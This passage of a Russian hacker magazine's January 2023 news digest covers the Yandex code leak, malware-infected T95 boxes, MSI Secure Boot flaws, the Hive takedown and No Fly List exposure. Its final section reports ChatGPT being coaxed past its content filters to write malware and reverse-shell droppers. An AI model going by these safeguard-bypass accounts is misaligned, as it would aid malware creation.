
                                                     январь 2023
            № 286
CONTENTS

    MEGANews
  Самые важные события в мире инфосека за январь

    Художники против ИИ
  Разбираемся с юридическим статусом творчества нейросетей

    Sad guard
  Ищем и эксплуатируем уязвимость в драйвере AdGuard для Windows

     Pivoting District
  Как работает GRE-пивотинг поверх сетевого оборудования

   ЖэПэО
   Эксплуатируем небезопасные групповые политики

    Только для чтения
  Пентестим Read-only Domain Controllers

    Опасный талисман
  Изучаем вредонос Talisman на практике

    FAQ по физическому пентесту
  Отвечаем на вопросы будущих взломщиков в белой шляпе

    Мертвая эра
  Изучаем приложение, созданное в BioEra

    HTB Health
   Эксплуатируем SSRF от первоначального доступа до захвата хоста

    HTB Shoppy
  Повышаем привилегии через группу Docker

    HTB UpDown
   Эксплуатируем Race Condition при атаке на веб‑сервер

    HTB Ambassador
  Повышаем привилегии через Consul

    ZUI
  Анализируем трафик с помощью нового быстрого инструмента

    Титры
  Кто делает этот журнал
                              ПОДПИСКА НА «ХАКЕР»




Мы благодарим всех, кто поддерживает
редакцию и помогает нам компенсировать
авторам и редакторам их труд. Без вас
«Хакер» не мог бы существовать, и каждый
новый подписчик делает его чуть лучше.




                        Напоминаем, что дает годовая подписка:

                            год доступа ко всем материалам, уже
                        опубликованным на Xakep.ru;
                            год доступа к новым статьям, которые
                         выходят по будням;
                         полное отсутствие рекламы на сайте
                           (при условии, что ты залогинишься);
                         возможность скачивать выходящие
                       каждый месяц номера в PDF, чтобы
                           читать на любом удобном устройстве;
                       личную скидку 20%, которую
                      можно использовать для продления
                          годовой подписки. Скидка накапливается
                               с каждым продлением.

                         Если по каким-то причинам у тебя еще нет
                           подписки или она скоро кончится,
                              спеши исправить это!
                                      Мария «Mifrill» Нефёдова
                                                  nefedova@glc.ru


В этом  месяце:  хакеры  интересуются  возможностями
ChatGPT, у Яндекса произошла  утечка исходных кодов,
на материнских платах MSI не работает Secure Boot, играть
в GTA Online может быть опасно, даркнет‑маркетплейсы
выпускают собственные Android-приложения, а также дру‐
гие интересные события прошедшего января.





У ЯНДЕКСА УТЕКЛИ
ИСХОДНЫЕ КОДЫ
В конце января на хакерском форуме была опубликована ссылка на скачивание
дампа, полученного из внутреннего репозитория компании «Яндекс». Общий
размер утечки составил 44,7 Гбайт в сжатом виде.
  Дамп   содержит   срезы   Git-репозиториев  Яндекса  с  исходными
кодами 79 сервисов и проектов компании, среди которых: поисковый движок
(фронтенд и бэкенд), бот индексации страниц, платформа веб‑аналитики
Yandex Metrika, картографическая система Yandex Maps, голосовой помощник
Алиса, информационная система службы поддержки, Yandex Phone, рекламная
платформа Yandex Direct, почтовый сервис Yandex Mail, хранилище Yandex Disk,
сеть доставки контента, торговая площадка Yandex Market, облачная плат‐
форма Yandex Cloud, платежная система Yandex Pay, Яндекс Поиск, Яндекс
Метрика, Яндекс Такси, Яндекс Путешествия, Яндекс 360 и внутренняя сис‐
тема диагностики Solomon.
  Дамп распространяется через торренты и поделен на отдельные архивы
(.tar.bz2), по названиям которых можно идентифицировать многие сервисы
Яндекса. Самые большие архивы — это frontend (18,26 Гбайт), classifieds
(4,67 Гбайт), market (4 Гбайт), taxi (3,3 Гбайт) и portal (2,35 Гбайт). Все файлы
утечки датированы 24 февраля 2022 года.
   Почти полный список файлов (за исключением архивов frontend и classifieds)
можно найти здесь .





Вскоре в пресс‑службе Яндекса подтвердили утечку, подчеркнув, что взлома
компании не было, а репозитории нужны лишь для работы с кодом и не пред‐
назначены для хранения персональных данных пользователей. В компании
заявляли,  что «не  видят  какой‑либо  угрозы  для  данных  пользователей
или работоспособности платформы». Причем, согласно сообщениям СМИ,
данные и вовсе слил инсайдер.
   Через несколько дней в блоге Яндекса появились первые результаты рас‐
следования инцидента.

       «Опубликованные фрагменты  действительно  взяты из нашего  внут-
       реннего репозитория — инструмента, с помощью которого разработ-«
      чики компании работают с кодом. При этом содержимое архива соот-
        ветствует устаревшей версии репозитория — она отличается от акту-
       альной версии, которая используется нашими сервисами.
         Первичный анализ показал, что опубликованные фрагменты не несут
      какой‑либо    угрозы   для   безопасности   наших    пользователей
      или работоспособности сервисов. В то же время мы решили, что сло-
      жившаяся ситуация — повод провести масштабный аудит всего содер-
      жимого репозитория», — сообщили в компании.                »
К сожалению, в ходе аудита обнаружилось несколько случаев серьезного
нарушения политик компании, в том числе принципов Яндекса и правил кор‐
поративной этики. В отчете приводится несколько примеров таких нарушений.
 • Оказалось, что в коде содержались контактные данные партнеров ком‐
   пании. Например, водителей — в некоторых случаях их контакты и номера
   водительских удостоверений передавались из одного таксопарка в другой.
 • Были зафиксированы случаи, когда логику работы сервисов корректировали
   не алгоритмическим способом, а «костылями». Через такие «костыли»
   исправляли отдельные ошибки системы рекомендаций, которая отвечает
   за дополнительные элементы поисковой выдачи, и регулировали настройки
   поиска по картинкам и видео.
 • В сервисе «Яндекс Лавка» существовала возможность настроить вручную
   рекомендации любых товаров без пометки об их рекламном характере.
 • Обнаружилось наличие  приоритетной поддержки для отдельных групп
   пользователей в сервисах «Такси» и «Еда».
 • Некоторые части кода содержали слова, которые никак не влияли на работу
   сервисов, но сами по себе были оскорбительны для людей разных рас
   и национальностей.
 • Опубликованные фрагменты кода содержали в том числе и тестовые алго‐
   ритмы, которые использовались только внутри Яндекса для проверки кор‐
   ректности работы сервисов. Например, для улучшения качества активации
   ассистента и уменьшения количества ложных срабатываний в бета‑версии
   для  сотрудников  применяется  настройка, которая  включает микрофон
   устройства на несколько секунд в случайный момент без упоминания Али‐
   сы.

Согласно отчету, большинство выявленных проблем было связано с попыт‐
ками вручную внести в сервис улучшение или устранить ошибку. «Ошибки —
часть жизни. Их не избежать, если у тебя не статичный, а постоянно развива‐
ющийся продукт», — отмечают в компании.
  В связи с этим представители компании признали, что им очень стыдно
за случившееся и они должны принести извинения всем, кого могла затронуть
эта ситуация.

      «Один из принципов Яндекса гласит: наша работа строится на прин-
      ципах честности и прозрачности. Мы исходим из того, что любой внут-«
      ренний диалог, документ или исходный код при определенных обсто-
       ятельствах может стать публичным. И если это случится, нам не должно
      быть стыдно.
          Сейчас нам очень стыдно, и мы приносим извинения нашим поль-
       зователям и партнерам», — говорят в Яндексе.                »
Также в компании пообещали снова вернуться к вопросам техноэтики, возоб‐
новив работу по формированию ее стандартов и принципов. «Они будут опуб‐
ликованы на сайте компании и станут частью наших общих политик. Все фраг‐
менты кода, которые противоречат им, будут исправлены», — заверили раз‐
работчики.


200 АТАКОВАННЫХ ОРГАНИЗАЦИЙ
По данным Emsisoft, в 2022 году от атак шифровальщиков пострадали более 200 крупных аме‐
риканских организаций в государственном, образовательном и здравоохранительном  сек‐
торах. По сравнению с 2021 годом количество атак вымогателей на муниципальные органы
власти выросло с 77 случаев до 105.


Эксперты говорят, что отслеживать атаки на медицинские учреждения сложно в силу «нечет‐
кого раскрытия информации». И хотя таких инцидентов официально насчитывается всего 24,
последствия этих взломов могли затронуть более 289 больниц и клиник.





ANDROID-
ПРИСТАВКИ
С МАЛВАРЬЮ
Канадский сисадмин Даниэль Милишич (Daniel Milisic) обнаружил, что прошив‐
ка купленной им на Amazon Android-приставки T95 была заражена сложной
малварью прямо «из коробки».
   Вредонос был в прошивке приставки T95 с процессором AllWinner H616,
которая продается на Amazon, AliExpress и других крупных маркетплейсах
в разных странах мира. Милишич отмечает, что такие приставки проходят
совершенно неясный путь от производства в Китае до прилавков виртуальных
магазинов. Во многих случаях девайсы продаются под разными брендами
и названиями, а четкого указания их происхождения попросту нет.
   Кроме того, поскольку такие устройства обычно проходят через множество
рук, поставщики и реселлеры имеют множество возможностей для загрузки
на них кастомых ROM, включая потенциально вредоносные.
   Исследователь рассказал, что изученное им устройство T95 использовало
ROM на базе Android 10, подписанный тестовыми ключами, и ADB (Android
Debug Bridge), открытый через Ethernet и Wi-Fi. Эта конфигурация уже нас‐
тораживает: ADB может использоваться для подключения к устройствам, неог‐
раниченного доступа к файловой системе, выполнения команд, установки ПО,
изменения данных и удаленного управления девайсом. Но так как большинс‐
тво потребительских устройств защищены брандмауэром, злоумышленники
вряд ли смогут удаленно подключиться к ним через ADB.
   Милишич изначально приобрел устройство, чтобы запустить на нем DNS
sinkhole Pi-hole, защищающую устройства от нежелательного контента, рек‐
ламы и вредоносных сайтов без установки дополнительного ПО. Однако после
анализа DNS-запросов в Pi-hole он заметил, что устройство пыталось подклю‐
читься к нескольким IP-адресам, связанным с активной малварью.
   Судя по всему, установленная на устройстве малварь — это сложный
Android-вредонос CopyCat, обнаруженный экспертами из компании Check
Point в 2017  году. Уже  тогда  аналитики  считали, что малварь  заразила
более 14 миллионов устройств по всему миру, получила root-доступ к 8 мил‐
лионам из них и всего за два месяца принесла своим авторам около 1,5 мил‐
лиона долларов США.

      «Я  обнаружил  слои  поверх  вредоносного  ПО,  используя  tcpflow
      и nethogs для мониторинга трафика, и отследил вредонос до вызыва-«
      ющего нарушение процесса/APK, который затем удалил из ROM, —
       объясняет исследователь. — Но последняя часть вредоносного ПО,
      которую мне не удалось проследить, внедряет процесс system_server и,
      похоже, глубоко интегрирована в прошивку».                »
Оказалось, что вредонос упорно пытается получить дополнительную полезную
нагрузку с сайтов ycxrl[.]com, cbphe[.]com и cbpheback[.]com. Поскольку соз‐
дать чистую прошивку для замены вредоносной оказалось трудно, Милишич
решил изменить DNS C&C, чтобы направить запросы через веб‑сервер Pi-hole
и заблокировать их.
   Исследователь отмечает, что ему неизвестно, многие ли Android-приставки
этой модели на Amazon заражены, и он не знает, как именно это произошло,
но всем пользователям T95 он рекомендует выполнить два простых шага, что‐
бы точно очистить свое устройство и нейтрализовать вредоносное ПО, которое
может на нем работать:
 • перезагрузить девайс в режиме  восстановления или выполнить сброс
   к заводским настройкам через меню;
 • после перезагрузки подключиться к ADB через USB или Wi-Fi-Ethernet
   и запустить созданный им скрипт .

Чтобы убедиться, что малварь обезврежена, следует запустить adb logcat |
grep Corejava и удостовериться, что команду chmod выполнить не удалось.
   Учитывая, что такие устройства весьма недороги, исследователь отмечает,
что, возможно, более разумным выходом будет вообще прекратить исполь‐
зовать их.


40 000 000 ДОЛЛАРОВ НА ОТДЫХ И ЕДУ

СМИ выяснили, что только за девять последних месяцев руководство обанкротившейся крип‐
товалютой биржи FTX потратило более 40 миллионов долларов на отели, еду, развлечения
и перелеты.

Около 5,8 миллиона долларов было потрачено на отель Albany — курорт на берегу океана
с собственной пристанью для яхт и полем для гольфа, где бывший глава FTX Сэм Бэн‐
кман‑Фрид проживал в пентхаусе.

6,9 миллиона долларов были потрачены на «еду и развлечения». Почти половина этой сум‐
мы — услуги общественного питания, причем 1,4 миллиона долларов пришлось на питание
сотрудников в отеле Hyatt.





У MSI НЕ РАБОТАЕТ
SECURE BOOT
Новозеландский студент Давид Потоцкий (Dawid Potocki) случайно обнаружил,
что на 290 моделях материнских плат MSI по умолчанию не работает функция
Secure Boot, отвечающая за безопасную загрузку UEFI. Это означает, что
на уязвимых машинах можно запустить любой образ ОС независимо от того,
подписан ли он и подлинная ли подпись.
   Исследователь нашел проблему  случайно, во время  настройки нового
компьютера. «Я  обнаружил,  что  прошивка  принимает любой образ ОС,
который я ей предоставляю, неважно, доверенный он или нет», — писал он
в своем блоге.
   Оказалось, что еще в январе 2022 года компания MSI обновила настройки
в разделе Secure Boot в своем UEFI/BIOS, изменив значения по умолчанию
с релизом новой прошивки. В итоге все значения в подразделе Image Execution
Policy  оказались  установлены  на  Always  Execute  («Всегда  выполнять»).
Это  означает,  что, если  вредоносное ПО  изменило  загрузчик ОС, MSI
UEFI/BIOS все равно загрузит вредоносный образ, даже если с его криптогра‐
фической подписью явно не все в порядке.





Потоцкий говорит, что настройки, конечно, нужно исправить на более разум‐
ные, установив значение Deny Execute («Запретить выполнение») как минимум
для Removable Media и Fixed Media.
   Однако, обнаружив проблему на своей машине, Потоцкий пошел дальше
и решил выяснить, только ли его материнскую плату «улучшили» разработчики
MSI. Оказалось, что проблема куда масштабнее: производитель изменил нас‐
тройки на небезопасные для более чем 290 моделей материнских плат (для
процессоров как Intel, так и AMD), полный список которых можно найти здесь .

      «Какие бы функции безопасности вы ни включали, не верьте, что они
       работают, ПРОВЕРЬТЕ ИХ! Каким‑то образом я оказался первым, кто«
       задокументировал эту проблему, хотя впервые она возникла где‑то
      в третьем квартале 2021 года», — заключает исследователь.                »
Всем пользователям материнских плат MSI Потоцкий рекомендует проверить
настройки и в случае необходимости установить безопасные значения в раз‐
деле Image Execution Policy.


ПРАВООХРАНИТЕЛИ ВЗЛОМАЛИ HIVE





Правоохранительные органы тринадцати стран мира приняли участие в операции по  лик‐
видации инфраструктуры RaaS-шифровальщика  Hive.  Министерство  юстиции США, ФБР
и Европол заявили, что сумели проникнуть в инфраструктуру хак‑группы еще в июле прошлого
года, регулярно  перехватывали ключи дешифрования и предотвратили выплату выкупов
на общую сумму около 130 миллионов долларов.

          «Незаметно для  Hive  в ходе  киберзасады наша  следственная  группа→       на законных основаниях проникла в сеть Hive и скрывалась там несколько
       месяцев, неоднократно перехватывая ключи дешифрования и передавая их
       жертвам, чтобы освободить их от вымогателей. В течение нескольких месяцев
     мы помогали жертвам победить злоумышленников и лишали Hive прибылей
       от вымогательства. Проще говоря, мы хакнули хакеров, используя законные
        средства. Мы побили Hive их же оружием и разрушили их бизнес‑модель»,


— заявила заместитель генерального прокурора Лиза Монако на пресс‑конференции.





GTA ONLINE
НЕБЕЗОПАСНА
ДЛЯ ИГРОКОВ
В игре обнаружили уязвимость, которая может привести к потере игрового
прогресса, краже игровых денег, бану и другим неприятным последствиям.
Эксперты предупредили, что еще немного и эксплоит для этой проблемы поз‐
волит добиться удаленного выполнения кода через GTA Online, то есть хакеры
смогут удаленно запустить малварь на компьютерах с работающей игрой.
  20 января об этой уязвимости сообщил Twitter-аккаунт Tez2, посвященный
играм Rockstar Games. По его информации, множество игроков GTA Online
жаловались на потерю прогресса, баны и кики, с которыми им пришлось стол‐
кнуться в последнее время. Форумы поддержки Rockstar Games действитель‐
но  оказались  завалены  многочисленными  сообщениями  пользователей
о проблемах с учетными записями.





                                       Продолжение статьи →
← Начало статьи

   Tez2 настоятельно рекомендовал всем пользователям не играть без брандма‐
   уэра и писал, что разработчики уже знают о проблеме и работают над ее
   решением.
      Вскоре после этого информацию о проблеме разместили в закрепленном
  сообщении на сабреддите GTA Online. Там пользователям рекомендовали
   вообще не заходить в игру, пока разработчики Rockstar Games не выпустят
   патч, так как эксплоит для опасной уязвимости уже доступен в сети. На Reddit
   подчеркивали,  что даже  одиночный режим  может  представлять  угрозу
   безопасности, а эксплуатация бага может приводить к «порче» аккаунта, после
   чего, вероятно, останется только заводить новый.
    По информации СМИ, за этот переполох, похоже, ответственен разработчик
   читов North GTA Online, который добавил в свой продукт новые «функции»,
   связанные с уязвимостью, 20 января 2023 года (в рамках версии 2.0.0). Также,
  по информации журналистов, уязвимость уже получила идентификатор CVE
  и отслеживается как CVE-2023-24059.





  При этом разработчик North GTA Online заявил, что избавился от опасных фун‐
  кций буквально на следующий день, 21 января, и принес всем извинения
   за неожиданный хаос, который это спровоцировало. По его словам, было
   ошибкой сделать публичными функции, связанные с удалением денег игроков
  и порчей аккаунтов.
     Так как Rockstar Games до сих пор не выпустила патчей, специалисты пре‐
   дупреждают, что эксплоит для этой уязвимости связан с «частичным удален‐
  ным выполнением произвольного кода», то есть может привести к взлому
  не только учетных записей GTA Online, но и любого компьютера, на котором
   запущена игра.
      Так, Speyedr, разработчик известного кастомного брандмауэра для GTA V
  под названием Guardian, говорит, что злоумышленники уже находятся «на гра‐
  ни обнаружения» способа для полного удаленного выполнения кода через GTA
   Online. Он подчеркивает, что Guardian по‑прежнему работает и  эксплоит
  не может его обойти, но необходимо правильно настроить брандмауэр, чтобы
   тот мог защитить пользователей от эксплуатации уязвимости.
    По этой причине разработчик временно удалил файлы Guardian с GitHub
  и призвал всех пользователей Windows держаться подальше от GTA Online,
  пока ошибка не будет исправлена.


  УТЕКЛИ ДАННЫЕ 75% ЖИТЕЛЕЙ РОССИИ
  В прошлом году в открытом доступе в результате утечек оказались данные 3/4 россиян .
   К таким выводам пришли аналитики компании DLBI (Data Leakage & Breach Intelligence), изучив
   более 260 крупных утечек, включая связанные с «Почтой России», Яндекс Едой и Delivery Club,
   СДЭК, «Гемотестом», «Туту.ру».

   Общий объем проанализированных утечек составил 99,8 миллиона уникальных email-адресов
   и 109,7 миллиона уникальных телефонных номеров.

  По мнению основателя сервиса DLBI Ашота Оганесяна, это можно соотнести с численностью
   населения России, где у большинства есть только один телефонный номер, и тогда получа‐
   ется, что в прошлом году утекли данные 75% всех жителей России или 85% жителей взрос‐
   лого (трудоспособного) и старшего возраста.





 ДАРКНЕТ-
 МАРКЕТПЛЕЙС
 SOLARIS ХАКНУЛИ
 КОНКУРЕНТЫ
   Крупный маркетплейс Solaris, специализирующийся на продаже наркотиков
  и других запрещенных веществ, был захвачен более мелким конкурентом,
   известным под названием Kraken. Хакеры утверждают, что взломали кон‐
  курирующую площадку 13 января 2023 года.
       Solaris работает не так давно. Он появился на свет после закрытия «Гидры»
   властями и пытается переманить к себе часть пользователей исчезнувшего
   маркетплейса. Торговая площадка довольно быстро захватила около 25% рын‐
   ка, и через нее уже прошло около 150 миллионов долларов.
      Согласно свежему отчету компании Resecurity, от закрытия «Гидры» боль‐
  ше всего выиграли торговые площадки RuTor, WayAway, Legalizer, OMG!, Solaris
  и Nemesis. По данным исследователей, закрытие «Гидры» принесло Solaris
   около 60 тысяч пользователей, тогда как упомянутый выше Kraken получил
  лишь около 10% от этого количества (примерно 6500 человек).





   Журналисты издания Bleeping Computer сообщили, что Solaris — это русско‐
   язычная площадка, которую исследователи связывают с хак‑группой Killnet,
   регулярно устраивающей DDoS-атаки на западные организации. К примеру,
   блокчейн‑аналитики из компании Elliptic отследили несколько пожертвований
   от Solaris для Killnet на общую сумму более 44 тысяч долларов в биткоинах.
   Предполагается, что группа использовала эти деньги, чтобы купить больше
   «огневой мощи» для проведения DDoS-атак.
      Также отмечалось, что в декабре прошлого года украинский ИБ‑специалист
  Алекс Холден заявил, что ему удалось взломать Solaris и похитить 25 тысяч
   долларов, которые он затем пожертвовал украинской гуманитарной организа‐
   ции. Тогда администраторы Solaris опровергали заявления о взломе, ссылаясь
  на отсутствие доказательств, но Холден позже опубликовал более детальное
   описание своей атаки, а также слил исходный код и базы данных, предположи‐
   тельно связанные с маркетплейсом.
    В итоге 13 января 2023 года представители Kraken объявили, что они зах‐
   ватили инфраструктуру Solaris, репозиторий торговой площадки на GitLab и все
  исходные коды проекта, благодаря «нескольким огромным ошибкам в коде».





   Заявление Kraken гласит, что хакерам потребовалось три дня, чтобы похитить
  пароли и ключи, хранившиеся на серверах Solaris открытым текстом, получить
   доступ к инфраструктуре, расположенной в Финляндии, а затем без спешки
   скачать все необходимое. Также злоумышленники заявили, что отключили бит‐
   коин‑сервер Solaris, «чтобы никто ничего не воровал», и эту информацию под‐
   твердили специалисты компании Elliptic.
      Администрация Solaris не делала никаких заявлений о статусе платформы
  и обоснованности заявлений Kraken, но исследователи полагают, что за всем
  этим вряд ли стоят политические причины, скорее дело в финансах, а также
   «рыночных» интересах разных хакерских группировок.


  DDOS-АТАКИ В 2022 ГОДУ УЧАСТИЛИСЬ

    Аналитики компании «Ростелеком‑Солар» подготовили отчет об атаках на онлайн‑ресурсы рос‐
    сийских компаний по итогам 2022 года. По данным компании, минувший 2022 год изменил весь
   ландшафт киберугроз, а количество атак выросло в разы.

   Самым атакуемым регионом в 2022 году стала Москва, так как именно здесь сконцентрирова‐
   на большая часть организаций. Суммарно на регион пришлось более 500 тысяч DDoS-атак.
   Далее следуют  Уральский федеральный округ  (почти 100 тысяч атак) и Центральный
   федеральный округ (чуть более 50 тысяч инцидентов).





   Основной поток DDoS-атак не отличался высокой мощностью: они не превышали 50 Гбит/с .
   Зато стало больше мощных целевых атак на конкретные компании и «массированных ударов»,
    приуроченных к каким‑то конкретным событиям. Так, в феврале исследователи зафиксировали
    атаку мощностью более 760 Гбит/с , что почти в два раза превышает самую мощную атаку
   предыдущего года.


   Длительность большинства атак была невысокой, но отдельные из них оказались рекордными
   по продолжительности. В частности, одна из DDoS-атак длилась 2000 часов (почти три
   месяца).

   Наибольшее число ( 30% ) веб‑атак было направлено на госсектор. Его атаковали как минимум
   в три, а местами и в 12 раз чаще, чем в 2021 году.





  ГЛАВУ ФБР БЕСПОКОИТ КИТАЙСКИЙ ИИ





   Выступая на Всемирном экономическом форуме в Давосе, директор ФБР Кристофер Рэй
   заявил, что он глубоко обеспокоен программой по развитию искусственного интеллекта
   в Китае. Дело в том, что, по его словам, власти страны «не ограничивают себя правовыми нор‐
   мами», а амбиции Пекина в области ИИ  «строятся на основании огромного количества
   интеллектуальной  собственности и  конфиденциальных  данных, которые были похищены
   в прошлые годы».

             «Этот вопрос глубоко нас беспокоит, и думаю, все присутствующие должны →         быть обеспокоены так же. Что касается ИИ в целом — это классический пример
           технологии, на которую я каждый раз реагирую одинаково. Я думаю: „Ух ты, мы
        можем такое сделать?“, а потом думаю: „О боже, они тоже могут такое сде‐
           лать“»,


  — поделился своими опасениями Рэй.





 ЗАБЫТЫЙ NO FLY LIST
   Американская авиакомпания CommuteAir случайно оставила на незащищенном
   сервере список лиц, которых нельзя пускать на борт самолетов, летящих
   в США или из США (так называемый No Fly List). Эта базу, содержащую более
   полутора миллиона записей, обнаружил швейцарский хакер maia arson crimew,
   считающий себя хактивистом. Исследователь рассказал, что просто скучал
  и копался в IoT-поисковике ZoomEye (китайский аналог Shodan), когда наткнул‐
   ся на очередной незащищенный сервер Jenkins, которых в интернете предос‐
   таточно.
      Однако на этом конкретном сервере внимание arson crimew привлекли
   аббревиатура ACARS  (Airborne  Communications  Addressing and  Reporting
   System) и многочисленные упоминания слова crew («экипаж»), после чего
   выяснилось,   что  незащищенная  машина   принадлежит   авиакомпании
   CommuteAir.





  На открытом для всех желающих сервере хранились самые разные данные,
   включая  личную  информацию  примерно 9000  сотрудников  CommuteAir,
  путевые листы рейсов. Исследователь также обнаружил, что может легко
   получить доступ к планам полетов, информации о техническом обслуживании
   самолетов и другим данным.
      Кроме того, в итоге на сервере нашелся файл с копией так называемого
  No Fly List, датированной 2019 годом. Этот список содержит более 1,56 мил‐
  лиона записей и включает в себя имена и даты рождения, хотя многие записи
   дублируются.
      Такие  базы  появились  в  начале  2000-х,  после  террористических
   атак 11 сентября. Сначала они содержали лишь несколько десятков имен (в
  основном это были люди, которые причастны к террористической деятельнос‐
   ти или обоснованно подозреваются в этом), но после терактов и создания
   Министерства внутренней безопасности США списки стали быстро пополнять‐
   ся.
      Точное количество людей, которые в настоящее время есть в No Fly List,
   неизвестно, к тому же списки содержат по несколько записей для одного
   человека, но по последним оценкам в них числятся от 47 тысяч до 81 тысячи



         «Это извращенный продукт американских правоохранителей и полицей-
           ского государства США в целом, — говорит arson crimew. — Просто   человек.«
          список без каких‑либо надлежащих правовых процедур… В основном
         [люди попадают в него] просто на том основании, что они знакомы
         с кем‑то или [живут] в одной деревне с кем‑либо. Это имеет такие мас-
        штабы… Мне кажется, что подобному не должно быть места нигде».                 »
   Представители CommuteAir  подтвердили, что утечка действительно имела
   место и произошла из‑за неправильно настроенного сервера разработки.


          «Исследователь получил доступ к файлам, в том числе к устаревшей
          версии федерального списка no-fly от 2019 года, где были указаны «
          имена, фамилии и даты рождения, — говорится в заявлении  ком-
         пании. — Кроме того, благодаря информации, найденной на сервере,
          исследователь обнаружил доступ к базе данных, содержащей личную
        информацию  сотрудников  CommuteAir.  Согласно  предварительному
           расследованию, данные клиентов не пострадали. CommuteAir немед-
         ленно отключила затронутый сервер и начала расследование инциден-
           та».                 »
  В своем блоге arson crimew пообещал предоставить список журналистам
  и правозащитным организациям ради «общественного блага». При этом пуб‐
   ликовать список в открытом доступе исследователь все же счел неправиль‐
  ным.


 ДОХОДЫ ВЫМОГАТЕЛЕЙ ПАДАЮТ

  По данным блокчейн‑аналитиков из Chainalysis и Coveware, доходы от вымогательских атак упа‐
   ли с 765,6 миллиона долларов в 2021 году до 456,8 миллиона долларов в 2022 году. Экспер‐
   ты объясняют падение почти на 40% множеством факторов, но основная причина банальна:
   все больше жертв попросту отказываются платить хакерам.





                                Общая прибыль вымогателей по годам

   Процент компаний, заплативших выкуп хакерам в 2022 году, упал до 41% (по сравнению с 50%
   в 2021 году и 70% в 2020 году).

   При этом средние и медианные выкупы значительно выросли, особенно в последнем квар‐
   тале 2022 года по сравнению с предыдущим кварталом. Растет и средний размер компаний,
   которые становятся жертвами вымогателей, — тоже из‑за того, что злоумышленникам стали
   реже платить: атаки на более крупные компании позволяют хакерам требовать более крупные
   выкупы.





                                    Средняя и медианная сумма выкупа





                                        Медианный размер компании

    Интересно, что в 2022 году вымогательская малварь оставалась активной в среднем 70 дней,
   что намного меньше по сравнению со 153 днями в 2021 году и 265 днями в 2020 году.

   Исследователи связывают это с тем, что злоумышленники стремятся скрыть свою активность
   и действовать быстрее, поскольку многие из них работают сразу с несколькими штаммами
   вредоносного ПО.





                             «Срок жизни» вымогательского ПО по годам





 В ANDROID 14
 ЗАПРЕТЯТ СТАРЫЕ
 ПРИЛОЖЕНИЯ
  В грядущей Android 14 появится запрет на установку приложений, предназна‐
   ченных для устаревших версий Android. Нельзя будет даже загрузить APK-файл
  и установить вручную. Разработчики надеются, что эти меры помогут в борьбе
  с вредоносным ПО.
      Правила Google изменились в прошлом месяце, и теперь недавно добав‐
  ленные в Play Store приложения должны быть ориентированы как минимум
  на Android 12. Более того, если раньше разработчик хотел создать приложение
  для более старой версии, он мог попросить своих пользователей загрузить
   нужный APK-файл  вручную.  Кроме  того,  если  приложение  для  Android
  не обновлялось после изменения гайдлайнов, Play Store все равно продолжал
   предоставлять его пользователям, установившим приложение до этого.
    В Android 14 требования к API будут ужесточены, а установку устаревших
   приложений полностью заблокируют. Так, изменения запретят загружать APK-
   файлы пользователям и устанавливать такие приложения магазинам.
      Сначала устройства на Android 14 будут блокировать только приложения,
   предназначенные для совсем старых версий Android. Но со временем планиру‐
   ется повысить этот порог до Android 6.0 (Marshmallow). Скорее всего, в итоге
   каждый производитель устройств самостоятельно установит порог для уста‐
   ревших приложений (если вообще будет его устанавливать).
      Блокируя устаревшие приложения, в Google надеются, что это поможет
   сдержать распространение малвари для Android. Так, разработчики говорят,
   что некоторые вредоносные приложения намеренно нацеливаются на старые
   версии Android, обходя таким способом защитные механизмы.


                                          Продолжение статьи →
← Начало статьи
 CHATGPT
 ЗАИНТЕРЕСОВАЛ
 ХАКЕРОВ
   Тему создания малвари с помощью ChatGPT уже пристально изучает ИБ‑сооб‐
   щество, а проведенные специалистами эксперименты показывают, что такое
   применение инструмента действительно возможно.
      Сначала специалисты компании Check Point обратили внимание, что зло‐
   умышленники (в том числе не имеющие никакого опыта в программировании)
  уже начали использовать языковую модель OpenAI для создания вредоносов
  и фишинговых писем, которые затем можно будет использовать в вымогатель‐
   ских, спамерских, шпионских, фишинговых и прочих кампаниях.
     К примеру, еще в прошлом месяце на неназванном хакерском форуме был
   опубликован скрипт, автор которого заявил, что это его первый опыт в прог‐
   раммировании, а ChatGPT сильно помог ему в написании кода. Исследователи
   отметили,  что  полученный  код  можно  превратить  в  готовую   прог‐
   рамму‑вымогатель, если устранить ряд проблем с синтаксисом.
    В другом случае еще один участник хак‑форума с лучшей технической под‐
   готовкой опубликовал два примера кода, написанного с использованием
   ChatGPT. Первым был Python-скрипт для кражи информации, который искал
   определенные типы файлов (например, PDF, документы MS Office и изоб‐
   ражения), копировал их во временный каталог, сжимал и отправлял на сервер,
   контролируемый  злоумышленником.  Второй фрагмент кода был написан
  на Java и тайно загружал PuTTY, запуская его с помощью PowerShell.





   Также стоит упомянуть, что в декабре прошлого года эксперты Check Point
  и сами попробовали применить мощности ChatGPT для разработки вредонос‐
  ного ПО и фишинговых писем. Результаты получились вполне рабочими
  и пугающими.
      Например, ChatGPT попросили  создать вредоносный макрос, который
   можно было скрыть в файле Excel, прикрепленном к письму. Сами эксперты
  не написали ни строчки кода, но сразу получили довольно примитивный
   скрипт. ChatGPT попросили повторить попытку и улучшить код, после чего
   качество кода действительно значительно повысилось.





   Затем исследователи использовали более продвинутый ИИ‑сервис Codex
  для разработки реверс‑шелла, скрипта для сканирования портов, обнаружения
   песочницы и компиляции Python-кода в исполняемый файл Windows.

        «В результате мы создали фишинговое электронное письмо с прик-
         репленным к нему документом Excel, содержащим вредоносный код «
         VBA, который загружает реверс‑шелл на целевую машину. Вся сложная
         работа была проделана ИИ, а нам осталось лишь провести атаку», —
          резюмировали тогда специалисты.                 »
  К тому же в Check Point отметили быстро растущий интерес к ChatGPT среди
   русскоязычных хакеров: языковая модель может помочь им в масштабиро‐
  вании вредоносной активности. Так, русскоязычные злоумышленники старают‐
   ся обойти ограничения для доступа к API OpenAI. На хак‑форумах уже делятся
   советами, как разобраться с блокировкой по IP, решить проблему с банковски‐
  ми картами и номерами телефонов, то есть всем тем, что необходимо
  для получения доступа к ChatGPT.
      Словом, тема обхода геоблокировок сейчас весьма популярна в прес‐
  тупном сообществе, ведь в настоящее время ChatGPT недоступен в России,
   Китае, Афганистане, Украине, Беларуси, Венесуэле и Иране.
      Вскоре после Check Point аналитики из компании CyberArk подробно опи‐
   сали, как создавать полиморфные вредоносы с использованием ChatGPT. При‐
  чем вскоре они планируют опубликовать часть этой работы в сети «в учебных
   целях».
      Фактически в CyberArk сумели обойти фильтры контента ChatGPT и про‐
   демонстрировали, как «с очень небольшими усилиями и инвестициями со сто‐
  роны злоумышленника можно непрерывно запрашивать ChatGPT, каждый раз
   получая уникальный, функциональный и проверенный фрагмент кода».





                          Схема предложенной CyberArk атаки


         «Это приводит к созданию полиморфного вредоносного ПО, которое
